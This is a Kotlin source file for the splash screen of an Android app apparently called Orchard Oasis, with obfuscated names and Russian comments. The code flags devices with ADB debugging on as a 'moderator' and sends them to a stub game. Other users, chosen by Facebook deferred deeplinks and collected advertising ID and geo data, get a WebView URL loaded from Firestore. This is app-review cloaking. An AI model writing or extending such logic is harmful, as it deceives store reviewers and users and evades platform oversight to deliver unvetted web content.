package com.example.orchardoasis.vw.ay

import android.annotation.SuppressLint
import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.preference.PreferenceManager
import android.provider.Settings
import com.amplitude.api.Amplitude
import com.amplitude.api.AmplitudeClient
import com.amplitude.api.Identify
import com.example.orchardoasis.databinding.PlsTacBinding
import com.example.orchardoasis.mod.ct111.AMPLITUDE_API_KEY
import com.example.orchardoasis.mod.ct111.DEEPLINK
import com.example.orchardoasis.mod.ct111.FACEBOOK_ID
import com.example.orchardoasis.mod.ct111.FOR_GAME
import com.example.orchardoasis.mod.ct111.FOR_WEBVIEW_REPEAT
import com.example.orchardoasis.mod.ct111.NON_ORGANIC
import com.example.orchardoasis.mod.ct111.NOT_ORGANIC_INSTALL
import com.example.orchardoasis.mod.ct111.ORGANIC
import com.example.orchardoasis.mod.ct111.ORGANIC_INSTALL
import com.example.orchardoasis.mod.ct111.START_TIME
import com.example.orchardoasis.mod.ct111.TYPE
import com.example.orchardoasis.mod.de.FsTOreOasisOrch
import com.example.orchardoasis.mod.es.chckFrstStrtpplctn
import com.example.orchardoasis.mod.es.getStatusInstallation
import com.example.orchardoasis.mod.es.gtsCdnPhn
import com.example.orchardoasis.mod.es.svMnttrbt
import com.example.orchardoasis.mod.es.svSttsnstlltn
import com.example.orchardoasis.mod.es.svdvrtsngd
import com.example.orchardoasis.mod.ry.rEpOrchardOAs
import com.example.orchardoasis.vw.ia.iTnSptiV
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject

@SuppressLint("CustomSplashScreen")
class sAtwo : AppCompatActivity(),iTnSptiV {

    private lateinit var bndng: PlsTacBinding
    private lateinit var rpstr: rEpOrchardOAs
    private lateinit var frstr: FsTOreOasisOrch
    private lateinit var dtbs: FirebaseFirestore
    private lateinit var mpltd: AmplitudeClient

    private lateinit var sp:SharedPreferences

    private var strtTmr:Long = 0
    private var dplnkTmr:Int = 0

    private var flgDvMdn = true

    private var jbTm: Job = Job() // таймер для проверки органической установки

    private var flgDplnkFcbk = false // проверка были ли получены данные из Deeplink Facebook

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bndng = PlsTacBinding.inflate(layoutInflater)
        val view = bndng.root
        setContentView(view)

        sp = PreferenceManager.getDefaultSharedPreferences(this)

        // старт таймера для аналитики
        strtTmr = System.currentTimeMillis()

        // инициализация Facebook
        FacebookSdk.setApplicationId(FACEBOOK_ID)
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()

        // инициализация Amplitude
        mpltd = Amplitude.getInstance().initialize(applicationContext, AMPLITUDE_API_KEY)

        frstr = FsTOreOasisOrch(this,this,mpltd,strtTmr)
        rpstr = rEpOrchardOAs(this)

        mpltd.logEvent("app_open") // отправка ивента

        // проверка на модератора
        if(Settings.Global.getInt(applicationContext.contentResolver,"adb_enabled",0)==1){
            mpltd.logEvent("dev_mode_on") // отправка ивента
            flgDvMdn = false
            gTStbpplctn(FOR_GAME) // переход на заглушку
        }

        // отправка ивента
        mpltd.logEvent("iso_geo",JSONObject().put("geo",sp.gtsCdnPhn(applicationContext)))

        // отправка свойства юзера
        val identifyGeo = Identify().setOnce("ISO_GEO", sp.gtsCdnPhn(applicationContext))
        Amplitude.getInstance().identify(identifyGeo)

        //проверка первого запуска приложения
        if(sp.chckFrstStrtpplctn() && flgDvMdn){
            gtdvrtsngd()    // получение AdvertisingId
            gtDplnkFcbk()   // получение Deeplink Facebook
            chckrgncnstll() // проверка  органической установки
        }else{
            // действия при повторном запуске приложения
            // проверка на наличие значений + загрузка последней ссылки
            when(sp.getStatusInstallation()){
                ORGANIC_INSTALL -> { frstr.checkIsEmptyOrganic() }
                NOT_ORGANIC_INSTALL -> { frstr.checkIsEmptyNotOrganic() }
            }
        }
    }

    //функция перехода пользователя на заглушку для игры или показа WebView
    override fun gTStbpplctn(tp:String) {
        val ntnt = Intent(this,gAone::class.java)
        ntnt.putExtra(TYPE,tp)
        ntnt.putExtra(START_TIME,strtTmr)
        startActivity(ntnt)
    }

    // переход на заглушку для показа последней ссылки
    override fun showLastWebView(){
        if(flgDvMdn){
            mpltd.logEvent("repeat_enter") // отправка ивента
            gTStbpplctn(FOR_WEBVIEW_REPEAT)         // повторный переход на WebView в заглушке
        }
    }

    // функция проверки органической установки
    private fun chckrgncnstll(){
        jbTm = CoroutineScope(Dispatchers.Main).launch {
            delay(3000) // тайм-аут 15 секунд
            if(!(flgDplnkFcbk)){
                sp.svSttsnstlltn(ORGANIC_INSTALL) // статуса органическая установка

                // отправка свойства юзера
                val dntfsr = Identify().setOnce("USER_TYPE", ORGANIC)
                Amplitude.getInstance().identify(dntfsr)

                frstr.getUrlFromDatabase(ORGANIC_INSTALL,null,applicationContext.packageName) // загрузка сырой ссылки
            }
        }
    }

    //функция получения advertisingId из Firebase Analytics
    private fun gtdvrtsngd(){
        CoroutineScope(Dispatchers.IO).launch{
            dtbs = FirebaseFirestore.getInstance()
            val id = AdvertisingIdClient.getAdvertisingIdInfo(applicationContext).id
            if(id!=null){
                withContext(Dispatchers.Main){
                    sp.svdvrtsngd(id)
                }
            }
        }
    }

    //функция получения deeplink facebook
    private fun gtDplnkFcbk(){
        AppLinkData.fetchDeferredAppLinkData(this@sAtwo
        ) { appLinkData ->
            if (appLinkData != null) {
                flgDplnkFcbk = true // deeplink пришел
                dplnkTmr = ((System.currentTimeMillis() - strtTmr) / 1000).toInt() // время получения deeplink
                val dplnk = appLinkData.targetUri.toString().removePrefix("app://")

                // отправка ивента
                mpltd.logEvent("deep_received", JSONObject().put("data", dplnk))

                //отправка ивента
                mpltd.logEvent("deep_time", JSONObject().put("time", dplnkTmr))

                // отправка свойства юзера
                val dntfLnk = Identify().setOnce("LINK_TYPE", DEEPLINK)
                Amplitude.getInstance().identify(dntfLnk)

                // отправка свойства юзера
                val dntfsr = Identify().setOnce("USER_TYPE", NON_ORGANIC)
                Amplitude.getInstance().identify(dntfsr)

                sp.svSttsnstlltn(NOT_ORGANIC_INSTALL)    // сохранение статуса неорганическая установка
                sp.svMnttrbt(dplnk)                      // сохранение deeplink
                val parts = dplnk.split("_")   // разбиение названия на части
                frstr.getUrlFromDatabase(NOT_ORGANIC_INSTALL, parts, applicationContext.packageName) // загрузка сырой ссылки с обработкой
            }
        }
    }

}